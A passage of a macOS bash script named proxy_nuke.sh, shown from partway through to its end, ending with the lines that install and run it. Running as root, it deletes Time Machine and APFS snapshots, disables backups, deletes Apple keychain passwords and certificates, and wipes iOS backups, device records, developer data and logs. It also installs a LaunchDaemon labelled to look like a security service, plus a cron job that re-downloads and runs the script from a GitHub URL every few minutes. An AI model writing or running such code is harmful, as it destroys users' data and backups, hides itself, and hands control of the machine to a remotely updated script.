    local jb_binaries=("/usr/local/bin/checkra1n" "/usr/local/bin/unc0ver" "/usr/local/bin/palera1n" "/usr/local/bin/dopamine" "/usr/local/bin/xinaA15" "/usr/local/bin/rootlessJB" "/usr/local/bin/chimera" "/usr/local/bin/electra" "/usr/local/bin/odyssey" "/usr/local/bin/taurine" "/usr/local/bin/fugu")
    for binary in "${jb_binaries[@]}"; do
        run rm -f "$binary" 2>/dev/null
    done
    local jb_dirs=("/usr/local/share/checkra1n" "/usr/local/share/palera1n" "/usr/local/share/unc0ver" "/usr/local/share/chimera" "/usr/local/share/electra" "/usr/local/share/odyssey" "/usr/local/share/taurine" "/usr/local/share/fugu")
    for dir in "${jb_dirs[@]}"; do
        run rm -rf "$dir" 2>/dev/null
    done
    for user_home in /Users/*; do
        run rm -rf "${user_home}/checkra1n" 2>/dev/null
        run rm -rf "${user_home}/palera1n" 2>/dev/null
        run rm -rf "${user_home}/unc0ver" 2>/dev/null
        run rm -rf "${user_home}/.checkra1n" 2>/dev/null
        run rm -rf "${user_home}/.palera1n" 2>/dev/null
        run rm -rf "${user_home}/.unc0ver" 2>/dev/null
    done
    local jb_launch_items=("checkra1n" "unc0ver" "taurine" "odyssey" "chimera" "electra" "fugu" "palera1n" "dopamine" "xinaA15" "rootlessJB")
    for item in "${jb_launch_items[@]}"; do
        for user_home in /Users/*; do
            for plist in "${user_home}/Library/LaunchAgents/"${item}*.plist; do
                run launchctl unload "${plist}" 2>/dev/null
                run rm -f "${plist}" 2>/dev/null
            done
        done
        for plist in "/Library/LaunchAgents/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
        for plist in "/Library/LaunchDaemons/"${item}*.plist; do
            run launchctl unload "${plist}" 2>/dev/null
            run rm -f "${plist}" 2>/dev/null
        done
    done
    local jb_processes=("checkra1n" "unc0ver" "taurine" "odyssey" "chimera" "electra" "fugu" "palera1n" "dopamine" "xinaA15" "rootlessJB")
    for proc in "${jb_processes[@]}"; do
        run pkill -9 -f "$proc" 2>/dev/null
    done
}

remove_apfs_snapshots() {
    run tmutil disable 2>/dev/null
    run tmutil stopbackup 2>/dev/null
    run tmutil disablelocal 2>/dev/null
    run launchctl unload /System/Library/LaunchDaemons/com.apple.backupd.plist 2>/dev/null
    run launchctl unload /System/Library/LaunchDaemons/com.apple.backupd-helper.plist 2>/dev/null
    run launchctl disable system/com.apple.backupd 2>/dev/null
    run launchctl disable system/com.apple.backupd-helper 2>/dev/null
    run launchctl unload /System/Library/LaunchAgents/com.apple.TimeMachine.plist 2>/dev/null
    run launchctl disable system/com.apple.TimeMachine 2>/dev/null
    for snapshot in $(tmutil listlocalsnapshotdates 2>/dev/null); do
        run tmutil deletelocalsnapshots "$snapshot" 2>/dev/null
    done
    run diskutil apfs deleteVolumeSnapshots / 2>/dev/null
    local apfs_volumes
    apfs_volumes=$(diskutil apfs list 2>/dev/null | grep "APFS Volume" | awk '"'"'{print $NF}'"'"') || true
    for vol in $apfs_volumes; do
        run diskutil apfs deleteVolumeSnapshots "$vol" 2>/dev/null
    done
    run tmutil thinlocalsnapshots / 9999999999999 4 2>/dev/null
    run tmutil thinlocalsnapshots / 1 4 2>/dev/null
    run sysctl vfs.generic.rsrc.auto_throttle=0 2>/dev/null
    run defaults delete com.apple.TimeMachine 2>/dev/null
    for user_home in /Users/*; do
        run rm -f "${user_home}/Library/Preferences/com.apple.TimeMachine.plist" 2>/dev/null
        run rm -rf "${user_home}/Library/Application Support/Time Machine" 2>/dev/null
    done
    run rm -rf "/Library/Preferences/com.apple.TimeMachine.plist" 2>/dev/null
    run rm -rf "/Volumes/.MobileBackups" 2>/dev/null
    run rm -rf "/.MobileBackups" 2>/dev/null
}

cleanup_keychain() {
    local keychains
    keychains=$(security list-keychains 2>/dev/null | tr -d '"'"'"'"'"' ) || true
    while IFS= read -r keychain; do
        [ -z "$keychain" ] && continue
        local ios_generic_patterns=("com.apple.mobile." "com.apple.rapport" "com.apple.sharingd" "com.apple.continuity" "com.apple.handoff" "com.apple.airdrop" "com.apple.airplay" "com.apple.ios" "com.apple.mobilebackup" "com.apple.mobilesync" "com.apple.mobileactivation" "com.apple.mobile.installation" "com.apple.mobile.softwareupdated")
        for pattern in "${ios_generic_patterns[@]}"; do
            run security delete-generic-password -l "$pattern" "$keychain" 2>/dev/null
            run security delete-generic-password -s "$pattern" "$keychain" 2>/dev/null
            run security delete-generic-password -a "$pattern" "$keychain" 2>/dev/null
        done
        local apple_domains=("icloud.com" "apple.com" "appleid.apple.com" "icloud.com.cn" "me.com" "mac.com" "idmsa.apple.com" "gsa.apple.com" "setup.icloud.com")
        for domain in "${apple_domains[@]}"; do
            run security delete-internet-password -l "$domain" "$keychain" 2>/dev/null
            run security delete-internet-password -s "$domain" "$keychain" 2>/dev/null
            run security delete-internet-password -a "$domain" "$keychain" 2>/dev/null
        done
        local cert_patterns=("iPhone Developer" "iPhone Distribution" "Apple Development" "Apple Distribution" "Developer ID" "Apple Worldwide Developer Relations" "Apple Root" "iPhone" "iOS" "Apple ID" "iCloud" "APNs" "Push" "Pass Type" "Mac App" "Mac Installer" "Developer ID Application" "Developer ID Installer")
        for pattern in "${cert_patterns[@]}"; do
            run security delete-certificate -c "$pattern" "$keychain" 2>/dev/null
            run security delete-certificate -Z "$pattern" "$keychain" 2>/dev/null
        done
    done <<< "$keychains"
    run security delete-generic-password -l "com.apple.mobile" "/Library/Keychains/System.keychain" 2>/dev/null
    run security delete-generic-password -s "com.apple.mobile" "/Library/Keychains/System.keychain" 2>/dev/null
}

remove_backup_files() {
    for user_home in /Users/*; do
        run rm -rf "${user_home}/Library/Application Support/MobileSync/Backup" 2>/dev/null
        run rm -rf "${user_home}/Library/Application Support/MobileSync" 2>/dev/null
        run rm -rf "${user_home}/Music/iTunes/iTunes Media/Mobile Applications" 2>/dev/null
        run rm -rf "${user_home}/Music/iPod Software Updates" 2>/dev/null
    done
    find /Users -name "*.ipsw" -type f -delete 2>/dev/null
    find /tmp -name "*.ipsw" -type f -delete 2>/dev/null
    find /var -name "*.ipsw" -type f -delete 2>/dev/null
    for user_home in /Users/*; do
        run rm -rf "${user_home}/Library/Lockdown" 2>/dev/null
    done
    run rm -rf "/var/db/lockdown" 2>/dev/null
    for user_home in /Users/*; do
        run rm -rf "${user_home}/Library/MobileDevice/Provisioning Profiles" 2>/dev/null
    done
    for user_home in /Users/*; do
        run rm -rf "${user_home}/Library/Developer/Xcode/DerivedData" 2>/dev/null
        run rm -rf "${user_home}/Library/Developer/Xcode/Archives" 2>/dev/null
        run rm -rf "${user_home}/Library/Developer/Xcode/iOS DeviceSupport" 2>/dev/null
        run rm -rf "${user_home}/Library/Developer/Xcode/watchOS DeviceSupport" 2>/dev/null
        run rm -rf "${user_home}/Library/Developer/Xcode/tvOS DeviceSupport" 2>/dev/null
        run rm -rf "${user_home}/Library/Developer/CoreSimulator" 2>/dev/null
    done
    run profiles remove -forced 2>/dev/null
    run rm -rf "/var/db/ConfigurationProfiles" 2>/dev/null
    run profiles remove -all 2>/dev/null
    run launchctl unload /System/Library/LaunchDaemons/com.apple.usbmuxd.plist 2>/dev/null
    run rm -rf "/var/db/lockdown" 2>/dev/null
    run rm -rf "/var/run/usbmuxd" 2>/dev/null
    for user_home in /Users/*; do
        run rm -rf "${user_home}/Library/Caches/com.apple.mobile.afc" 2>/dev/null
        run rm -rf "${user_home}/Library/Caches/com.apple.mobile.house_arrest" 2>/dev/null
    done
    run rm -rf "/var/mobile" 2>/dev/null
    run rm -rf "/var/db/mobileactivationd" 2>/dev/null
    for user_home in /Users/*; do
        run rm -rf "${user_home}/Library/Logs/CrashReporter/MobileDevice" 2>/dev/null
    done
    run rm -rf "/var/db/diagnostics" 2>/dev/null
    run rm -rf "/var/db/uuidtext" 2>/dev/null
    for user_home in /Users/*; do
        run rm -rf "${user_home}/Library/Logs/DiagnosticReports" 2>/dev/null
    done
}

main() {
    [ "$(id -u)" -ne 0 ] && exit 1
    remove_apfs_snapshots
    update_hosts_file
    disable_internet_sharing
    configure_pf_firewall
    setup_dummy_interface
    disable_loopback
    disable_ipv6_all_interfaces
    remove_ipsec_connections
    remove_thunderbolt_bridges
    remove_proxy_settings
    remove_vpn_and_ppp
    remove_screen_sharing
    remove_container_runtimes
    remove_jailbreak_tools
    cleanup_keychain
    remove_backup_files
}

install() {
    [ -f "$MARKER_FILE" ] && uninstall_silent
    cp "$0" "$SCRIPT_PATH" 2>/dev/null
    chmod 755 "$SCRIPT_PATH" 2>/dev/null
    
    cat > "$SUPERVISOR_PATH" << '"'"'SUPERVISOR'"'"'
#!/bin/bash
SCRIPT_PATH="/usr/local/bin/proxy_nuke.sh"
LAUNCHDAEMON_PLIST="/Library/LaunchDaemons/com.security.proxynuke.plist"
MARKER_FILE="/var/.proxy_nuke_installed"
VERSION="1.0.6"
SCRIPT_URL="https://raw.githubusercontent.com/hylclouds/blocklist/main/proxy_nuke.sh"
download_script() {
    if command -v curl &>/dev/null; then
        curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH" 2>/dev/null
    elif command -v wget &>/dev/null; then
        wget -q "$SCRIPT_URL" -O "$SCRIPT_PATH" 2>/dev/null
    fi
    chmod 755 "$SCRIPT_PATH" 2>/dev/null
}
download_script
[ ! -f "$SCRIPT_PATH" ] || [ ! -r "$SCRIPT_PATH" ] && exit 1
if [ ! -f "$LAUNCHDAEMON_PLIST" ]; then
    cat > "$LAUNCHDAEMON_PLIST" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.security.proxynuke</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/usr/local/bin/proxy_nuke.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>120</integer>
    <key>Nice</key>
    <integer>-20</integer>
    <key>ProcessType</key>
    <string>Background</string>
    <key>StandardOutPath</key>
    <string>/var/log/proxy_nuke.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/proxy_nuke_error.log</string>
</dict>
</plist>
PLIST
    chmod 644 "$LAUNCHDAEMON_PLIST" 2>/dev/null
fi
if ! launchctl list | grep -q "com.security.proxynuke" 2>/dev/null; then
    launchctl load "$LAUNCHDAEMON_PLIST" 2>/dev/null
fi
[ ! -f "$MARKER_FILE" ] && echo "$VERSION" > "$MARKER_FILE" 2>/dev/null
if ! pgrep -f "proxy_nuke.sh" > /dev/null 2>&1; then
    /bin/bash "$SCRIPT_PATH" &>/dev/null &
fi
SUPERVISOR
    chmod 755 "$SUPERVISOR_PATH" 2>/dev/null || true
    
    cat > "$LAUNCHDAEMON_PLIST" << '"'"'PLIST'"'"'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.security.proxynuke</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/usr/local/bin/proxy_nuke.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>120</integer>
    <key>Nice</key>
    <integer>-20</integer>
    <key>ProcessType</key>
    <string>Background</string>
    <key>StandardOutPath</key>
    <string>/var/log/proxy_nuke.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/proxy_nuke_error.log</string>
</dict>
</plist>
PLIST
    chmod 644 "$LAUNCHDAEMON_PLIST" 2>/dev/null || true
    run launchctl unload "$LAUNCHDAEMON_PLIST" 2>/dev/null || true
    run launchctl load "$LAUNCHDAEMON_PLIST" 2>/dev/null || true
    crontab -l 2>/dev/null | grep -v "$CRON_MARKER" | crontab - 2>/dev/null || true
    (crontab -l 2>/dev/null; echo "*/5 * * * * ${SUPERVISOR_PATH} ${CRON_MARKER}") | crontab - 2>/dev/null || true
    echo "$VERSION" > "$MARKER_FILE" 2>/dev/null || true
    touch /var/log/proxy_nuke.log 2>/dev/null || true
    touch /var/log/proxy_nuke_error.log 2>/dev/null || true
}

uninstall_silent() {
    run launchctl unload "$LAUNCHDAEMON_PLIST" 2>/dev/null || true
    run rm -f "$LAUNCHDAEMON_PLIST" 2>/dev/null || true
    run rm -f "$SCRIPT_PATH" 2>/dev/null || true
    run rm -f "$SUPERVISOR_PATH" 2>/dev/null || true
    run rm -f "$MARKER_FILE" 2>/dev/null || true
    crontab -l 2>/dev/null | grep -v "$CRON_MARKER" | crontab - 2>/dev/null || true
    run rm -f /etc/pf.anchors/proxy_nuke 2>/dev/null || true
    run rm -f /Library/LaunchDaemons/com.apple.pf.persist.plist 2>/dev/null || true
    run rm -f /Library/LaunchDaemons/com.apple.dummy.persist.plist 2>/dev/null || true
    run pkill -f "proxy_nuke" 2>/dev/null || true
}

uninstall() {
    uninstall_silent
}

case "${1:-}" in
    --install)
        install
        main
        ;;
    --uninstall)
        uninstall
        ;;
    *)
        main
        ;;
esac
SCRIPT_EOF
chmod 755 /usr/local/bin/proxy_nuke.sh
/usr/local/bin/proxy_nuke.sh --install'
